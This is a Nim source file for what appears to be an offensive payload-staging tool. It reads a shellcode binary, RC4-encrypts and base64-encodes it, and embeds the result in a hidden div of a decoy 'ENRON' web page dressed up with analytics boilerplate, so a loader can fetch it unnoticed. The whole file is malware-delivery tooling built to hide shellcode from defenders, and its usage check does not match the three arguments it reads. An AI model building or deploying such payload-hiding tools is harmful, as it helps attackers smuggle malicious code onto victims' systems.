import os, strformat
import core/rc_for
import core/util
from base64 import encode

proc processShellcode(fileName: string, binFile: string, key: string) =
  var
    keyBytes  = toBytes(key)
    data      = readBin(binFile)
    data2     = readFile(binFile)
    outDat    = rc4Apply(keyBytes, data) 
    outTxt    = trcEnc(key, data2)
    encsc: seq[byte] = toByteSeq(outTxt)
    b64 = encode(encsc)

  let htmlContent = """
<!DOCTYPE html>
<html>
<head>
    <title>ENRON</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
</head>
<body>
    <h1>We're Back</h1>
    <p>We're proud to be an energy company</p>
   
    <!-- a little something -->
    <div id="analytics" style="display:none">
        <!-- PAYLOAD_START -->
        """ & b64 & """
        <!-- PAYLOAD_END -->
    </div>
   
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
     
        ga('create', 'UA-12345678-1', 'enron.com');
        ga('send', 'pageview');
    </script>

    <footer>
        <p>Copyright © 1985 enron</p>
    </footer>
</body>
</html>
"""

  let f = open(&"{fileName}.txt", fmWrite)
  defer: f.close()
  f.write(b64)
  let f2 = open(&"{fileName}.html", fmWrite)
  defer: f2.close()
  f2.write(htmlContent)
  writeBin(&"{fileName}.dat", outDat)

when isMainModule:
  if paramCount() < 2:
    echo "Usage: .\\converter.exe in.bin 'RC4keyString'"
    quit 1

  let 
    fileName  = paramStr(1)
    binFile   = paramStr(2)
    keyStr    = paramStr(3)
  processShellcode(fileName, binFile, keyStr)
